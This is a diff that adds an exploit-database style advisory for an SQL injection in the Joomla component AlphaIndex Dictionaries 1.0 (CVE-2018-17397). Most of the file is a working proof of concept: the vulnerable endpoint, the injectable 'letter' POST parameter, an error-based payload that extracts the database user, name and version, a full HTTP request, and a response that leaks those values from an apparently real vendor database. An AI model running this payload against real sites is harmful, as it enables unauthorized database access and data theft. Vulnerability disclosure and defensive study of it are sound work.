@@ -1,0 +1,45 @@
+# # # # #
+# Exploit Title: Joomla! Component AlphaIndex Dictionaries 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-09-24
+# Vendor Homepage: http://multiplanet.gr/
+# Software Link: https://extensions.joomla.org/extensions/extension/authoring-a-content/alphaindex-dictionaries/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-17397
+# # # # #
+# Exploit Author: Ihsan Sencan
+# # # # #
+# POC: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_aindexdictionaries&task=getArticlesPreview
+# 
+# Parameter: letter=[SQL] (POST)
+#  
+# Payload: " AND (SELECT 66 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66 ,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VerAyari
+# 
+#  POST /alphaindex-dictionaries/index.php?option=com_aindexdictionaries&task=getArticlesPreview HTTP/1.1
+#  Host: localhost
+#  User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0
+#  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+#  Accept-Language: en-US,en;q=0.5
+#  Accept-Encoding: gzip, deflate
+#  Cookie: 4d2a26b1a22184c44838ed58a1427b57=a5ebafd40988be7421846f2e1a496b61
+#  Connection: keep-alive
+#  Upgrade-Insecure-Requests: 1
+#  Content-Type: application/x-www-form-urlencoded
+#  Content-Length: 200
+#  
+#  letter=" AND (SELECT 66 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66 ,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VerAyari
+#  HTTP/1.1 500 Duplicate entry 'multipla_multi@localhost : multipla_dictionary : 10.2.17-MariaDB' for key 'group_key' SQL=SELECT .............
+#  Server: nginx admin
+#  Date: Mon, 17 Sep 2018 16:15:28 GMT
+#  Content-Type: text/html; charset=utf-8
+#  Transfer-Encoding: chunked
+#  Connection: keep-alive
+#  Cache-Control: no-cache
+#  Pragma: no-cache
+#  
+# # # #
